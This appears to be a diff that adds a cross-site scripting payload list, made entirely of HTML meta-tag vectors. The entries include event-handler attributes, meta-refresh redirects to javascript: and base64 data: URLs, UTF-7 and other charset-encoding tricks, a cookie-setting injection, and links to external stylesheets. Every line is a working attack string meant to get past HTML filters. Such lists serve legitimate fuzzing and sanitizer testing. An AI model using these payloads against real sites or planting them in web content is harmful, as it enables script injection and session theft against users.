@@ -1,0 +1,66 @@
+<meta draggable="true" ondrag="alert(1)">test</meta>
+<meta draggable="true" ondragend="alert(1)">test</meta>
+<meta draggable="true" ondragenter="alert(1)">test</meta>
+<meta draggable="true" ondragleave="alert(1)">test</meta>
+<meta draggable="true" ondragstart="alert(1)">test</meta>
+<meta id=x tabindex=1 onactivate=alert(1)></meta>
+<meta id=x tabindex=1 onbeforeactivate=alert(1)></meta>
+<meta id=x tabindex=1 onbeforedeactivate=alert(1)></meta><input autofocus>
+<meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>
+<meta id=x tabindex=1 onfocus=alert(1)></meta>
+<meta id=x tabindex=1 onfocusin=alert(1)></meta>
+<meta onafterscriptexecute=alert(1)><script>1</script>
+<meta onbeforecopy="alert(1)" contenteditable>test</meta>
+<meta onbeforecut="alert(1)" contenteditable>test</meta>
+<meta onbeforepaste="alert(1)" contenteditable>test</meta>
+<meta onbeforescriptexecute=alert(1)><script>1</script>
+<meta onblur=alert(1) tabindex=1 id=x></meta><input autofocus>
+<meta onclick="alert(1)">test</meta>
+<meta oncontextmenu="alert(1)">test</meta>
+<meta oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<meta oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<meta ondblclick="alert(1)" autofocus tabindex=1>test</meta>
+<meta onfocusout=alert(1) tabindex=1 id=x></meta><input autofocus>
+<meta onkeydown="alert(1)" contenteditable>test</meta>
+<meta onkeypress="alert(1)" contenteditable>test</meta>
+<meta onkeyup="alert(1)" contenteditable>test</meta>
+<meta onmousedown="alert(1)">test</meta>
+<meta onmouseenter="alert(1)">test</meta>
+<meta onmouseleave="alert(1)">test</meta>
+<meta onmousemove="alert(1)">test</meta>
+<meta onmouseout="alert(1)">test</meta>
+<meta onmouseover="alert(1)">test</meta>
+<meta onmouseup="alert(1)">test</meta>
+<meta onmousewheel=alert(1)>requires scrolling
+<meta onpaste="alert(1)" contenteditable>test</meta>
+<meta onpointerdown=alert(1)>XSS</meta>
+<meta onpointerenter=alert(1)>XSS</meta>
+<meta onpointerleave=alert(1)>XSS</meta>
+<meta onpointermove=alert(1)>XSS</meta>
+<meta onpointerout=alert(1)>XSS</meta>
+<meta onpointerover=alert(1)>XSS</meta>
+<meta onpointerrawupdate=alert(1)>XSS</meta>
+<meta onpointerup=alert(1)>XSS</meta>
+<meta http-equiv="refresh" content="0; url=//portswigger-labs.net">
+<meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4+/v8
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<meta name="referrer" content="no-referrer">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>
+<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>?
+<meta charset="x-imap4-modified-utf7">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
+<meta charset="x-imap4-modified-utf7">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>
+<meta charset="mac-farsi">¼script¾javascript:alert(1)¼/script¾
+<META HTTP-EQUIV="Link" Content="<%(css)s>; REL=stylesheet">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(1);">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(1);">
+<meta charset= "x-imap4-modified-utf7"&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>
+<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
+<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
+
